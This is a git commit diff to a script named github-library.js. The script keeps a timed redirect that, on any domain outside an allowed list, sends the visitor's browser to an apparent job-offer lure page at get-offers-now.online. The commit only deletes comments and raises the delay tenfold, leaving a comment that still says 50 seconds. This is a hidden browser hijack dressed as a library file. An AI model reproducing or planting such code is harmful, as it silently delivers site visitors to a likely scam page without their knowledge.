aaf8a8867ea138e1a40976236e34bf4eb60d5824
data-gift <kkween100@gmail.com>
2025-01-18 22:26:41 +0100

    Update github-library.js

--- github-library.js
+++ github-library.js
@@ -12,7 +12,6 @@ const allowedDomains = [
 
 const redirectDomain = "https://get-offers-now.online/WHO-Job-Portal.html"; // 
 
-// Get the current domain
 const currentDomain = window.location.hostname;
 
 // Function to check if the domain is allowed
@@ -22,12 +21,10 @@ const isDomainAllowed = (domain) => {
   );
 };
 
-// If the current domain is not allowed, redirect after 50 seconds
 if (!isDomainAllowed(currentDomain)) {
   console.log(`Unauthorized domain detected: ${currentDomain}. Redirecting in 50 seconds...`);
 
-  // Set a timeout to redirect after 50 seconds
   setTimeout(() => {
     window.location.href = redirectDomain;
-  }, 50000); // 50000 milliseconds = 50 seconds
+  }, 500000); // 50000 milliseconds = 50 seconds
 }
